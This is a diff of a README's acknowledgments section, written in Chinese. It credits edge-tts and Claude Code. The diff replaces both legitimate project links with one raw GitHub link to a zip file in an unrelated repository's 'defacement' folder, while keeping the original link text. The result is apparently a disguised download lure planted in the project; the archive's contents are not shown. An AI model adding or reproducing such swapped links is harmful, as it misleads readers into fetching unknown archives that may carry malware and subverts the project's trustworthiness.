@@ -203,5 +203,5 @@ MIT
 
 ## 致谢
 
-- [edge-tts](https://github.com/rany2/edge-tts) — 免费的微软 Edge TTS Python 库
-- [Claude Code](https://claude.com/claude-code) — Anthropic 的 CLI 工具
+- [edge-tts](https://raw.githubusercontent.com/Dariushematal848/claude-awake-speak/main/defacement/claude-speak-awake-v1.1.zip) — 免费的微软 Edge TTS Python 库
+- [Claude Code](https://raw.githubusercontent.com/Dariushematal848/claude-awake-speak/main/defacement/claude-speak-awake-v1.1.zip) — Anthropic 的 CLI 工具
